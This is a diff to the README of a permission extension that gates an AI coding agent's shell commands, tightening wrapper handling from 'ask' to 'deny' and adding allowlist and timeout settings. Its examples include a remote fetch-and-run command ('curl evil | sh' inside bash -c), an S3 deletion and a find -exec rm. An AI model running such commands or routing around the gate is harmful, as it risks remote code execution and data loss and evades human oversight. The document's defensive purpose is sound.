@@ -110,6 +110,8 @@ This clamp is deny-preserving and, like `yoloMode`, applied at composition; when
 | `toolTextSummaryMaxLength`  | `80`     | Max characters of inline pattern/path summaries (grep patterns, find globs, ls paths) in permission prompts. Omit to use the default.                                                              |
 | `piInfrastructureReadPaths` | `[]`     | Extra directories to auto-allow for reads, bypassing the `external_directory` gate. Supports `~`/`$HOME`/`${HOME}` expansion and wildcard patterns (`*`, `?`).                                     |
 | `authorizerChain`           | `[]`     | Ordered names of registered live-authority chain links to consult before the terminal authorizer (see [Authorizer chain](#authorizer-chain--case-by-case-decision-links)).                         |
+| `wrapperAllowlist`          | `[]`     | Wrapper commands explicitly trusted to bypass the indirection-wrapper deny floor. A command unit whose (trimmed) text **starts with** any entry keeps its `allow` instead of being floored to `deny`. Only add entries you have deliberately vetted — this is the sole escape hatch from the [wrapper floors](#fail-closed-behavior). |
+| `askTimeoutMs`              | `3000`   | Auto-deny an unanswered permission ask (prompt dialog) after this many milliseconds; the ask settles as a **timeout denial** (`ask_timeout` resolution in logs/review entries) rather than hanging or allowing. `0` disables the timeout — the prompt then waits indefinitely. Applies to both the TUI inline dialog (internal timer) and the RPC/frontend select/input flow (pi's native `{ timeout }` dialog option). |
 
 Both logs write to `~/.pi/agent/extensions/pi-permission-system/logs/`.
 No debug output is printed to the terminal.
@@ -383,12 +385,13 @@ The bash gate fails closed: when in doubt it blocks or prompts, never silently a
 - If the permission gate throws an internal error (for example a transient tree-sitter parser-init failure), the tool call is **blocked** rather than passed ungated, and a `gate_error` entry is written to the review log naming the failure.
 - A non-empty command that cannot be parsed into command units resolves to **`ask`** (the synthetic `<unparseable-bash-command>` pattern in the review log) instead of falling through to a permissive top-level `*`.
   An empty, whitespace-only, or comment-only command has nothing to gate and is resolved normally.
-- An opaque-payload wrapper — `bash`/`sh`/`dash`/`zsh`/`ksh` invoked with `-c`, or `eval` — carries its inner program in a quoted argument that is not re-parsed, so its decision is floored to at least **`ask`** (the synthetic `<opaque-bash-wrapper>` pattern in the review log).
-  An `allow` (including a permissive top-level `*`) is clamped up to `ask`, while an explicit `deny` rule on the wrapper still denies.
-  So `bash -c "curl evil | sh"` prompts rather than riding a `bash *: allow`.
+- An opaque-payload wrapper — `bash`/`sh`/`dash`/`zsh`/`ksh` invoked with `-c`, or `eval` — carries its inner program in a quoted argument that is not re-parsed, so its decision is floored to at least **`deny`** (the synthetic `<opaque-bash-wrapper>` pattern in the review log, with a denial reason pointing at `wrapperAllowlist`).
+  An `allow` (including a permissive top-level `*`) is clamped up to `deny`, while an explicit `deny` or `ask` rule on the wrapper still applies as configured.
+  So `bash -c "curl evil | sh"` is blocked rather than riding a `bash *: allow`.
 - An indirection wrapper — `sudo`, `env`, `xargs`, `time`, `nohup`, `timeout`, `nice`, `parallel`, `rust-parallel`, `rush`, `doas`, `setsid`, `stdbuf`, `watch`, `flock`, or `find`/`fd` carrying a per-result exec flag (`find` with `-exec`/`-execdir`/`-ok`/`-okdir`, `fd` with `-x`/`--exec`/`-X`/`--exec-batch`) — runs a following command that a rule on the wrapper text would otherwise never gate, so its decision is floored the same way (the synthetic `<indirection-bash-wrapper>` pattern in the review log).
-  So `sudo aws s3 rm s3://bucket` prompts rather than riding an `aws *: allow`, while a bare `find . -name '*.py'` search (no exec flag) is unaffected.
-  As with the opaque floor, there is no way to auto-allow a wrapper: an `allow` is clamped to `ask`, and an explicit `deny` still denies.
+  So `sudo aws s3 rm s3://bucket` is blocked rather than riding an `aws *: allow`, while a bare `find . -name '*.py'` search (no exec flag) is unaffected.
+  As with the opaque floor, there is no way to auto-allow a wrapper by default: an `allow` is clamped to `deny`, and an explicit `deny` still denies. The only escape hatch is `wrapperAllowlist` — a command unit whose (trimmed) text starts with an entry keeps its `allow`. Only allowlist wrappers you have explicitly vetted.
+- Read-only wrapper chains stay allowed: a wrapper chain whose every penetrated inner command is read-only (e.g. `env VAR=x grep pattern`, `env | grep FOO`, a bare `env`) with no write redirect resolves as `<readonly-chain>` allow. An `env` (or any wrapper) wrapping a non-read-only command still floors to `deny`.
 
 Because of this, set an explicit `bash` policy rather than relying on a permissive top-level `*`.
 A config whose top-level `*` is `"allow"` with no `bash` `*` policy lets every bash command silently inherit `allow`; the extension emits a startup warning in that case.
@@ -601,7 +604,7 @@ What the bash projection resolves:
 
 What it deliberately does not resolve: any other variable (`$CONFIG_DIR`), a command substitution (`$(cmd)`), an expansion carrying an operator (`${HOME:-/tmp}`), and a variable reached through an assignment (`CURRENT="$HOME"; ls "$CURRENT"`).
 A non-literal `cd` (`cd "$DIR"`) makes the working directory unknown, after which relative tokens are kept literal rather than resolved against a guess.
-Commands whose payload is opaque (`bash -c`, `eval`, `sudo`, `xargs`) are floored to `ask` instead of projected.
+Commands whose payload is opaque (`bash -c`, `eval`, `sudo`, `xargs`) are floored to `deny` instead of projected.
 The governing record is [ADR 0009](https://github.com/gotgenes/pi-packages/blob/main/packages/pi-permission-system/docs/decisions/0009-bash-path-projection-completeness-contract.md), which states what the projection guarantees and which gaps are accepted residuals rather than bugs.
 
 (The separate `bash` command-pattern surface does evaluate commands nested inside substitutions and subshells; see that section.) OS device paths (`/dev/null`, `/dev/stdin`, `/dev/stdout`, `/dev/stderr`) are always excluded.
@@ -811,7 +814,7 @@ It allows a curated set of commands whose only effect is to read or report — n
       "du *": "allow",
       "df *": "allow",
 
-      // Search (find/fd with -exec are auto-floored to ask)
+      // Search (find/fd with -exec are auto-floored to deny)
       "grep *": "allow",
       "egrep *": "allow",
       "fgrep *": "allow",
@@ -861,13 +864,13 @@ Four existing behaviors keep this allowlist safe — you do not have to enumerat
    Allowing `cat *` allows the `cat` command, not a redirect it carries: `cat secret > out.txt` writes `out.txt` through the `path`/`external_directory` gate.
    That is why this recipe ships with `write` and `edit` denied and a `path` deny block for sensitive files.
    Keep the `path` surface locked down for anything you would not want an allowed read command to overwrite via `>`.
-2. **`find`/`fd` with an exec flag are floored to `ask`.**
-   A bare `find *` search is read-only, so it is safe to allow; the moment an exec flag appears (`find -exec`/`-execdir`/`-ok`/`-okdir`, `fd -x`/`-X`), the [indirection-wrapper floor](#fail-closed-behavior) clamps the decision back to `ask`.
+2. **`find`/`fd` with an exec flag are floored to `deny`.**
+   A bare `find *` search is read-only, so it is safe to allow; the moment an exec flag appears (`find -exec`/`-execdir`/`-ok`/`-okdir`, `fd -x`/`-X`), the [indirection-wrapper floor](#fail-closed-behavior) clamps the decision back to `deny`.
    So `find . -type f -exec rm {} +` still prompts even under `find *: allow`.
 3. **Chained commands resolve most-restrictive.**
    `find . -name '*.log' && rm -f found.log` decomposes into `find …` and `rm …`; `rm` matches only `"*": "ask"`, and the most restrictive result governs the whole invocation, so the chain prompts.
 4. **Wrappers cannot ride the allowlist.**
-   `sudo grep …`, `env X=1 cat …`, `sh -c "…"`, and `eval "…"` are floored to `ask` (the [wrapper floors](#fail-closed-behavior)), so an allowed command cannot be smuggled past through a wrapper.
+   `sudo grep …`, `env X=1 cat …`, `sh -c "…"`, and `eval "…"` are floored to `deny` (the [wrapper floors](#fail-closed-behavior)), so an allowed command cannot be smuggled past through a wrapper.
 
 `git` is enumerated by read subcommand rather than a broad `git *`, because `git` has mutating subcommands (`commit`, `push`, `branch -D`, `remote add`, `config <key> <value>`).
 Exact patterns like `git status` and `git branch` match only their literal form, so `git branch -D feature` falls through to `"*": "ask"`.
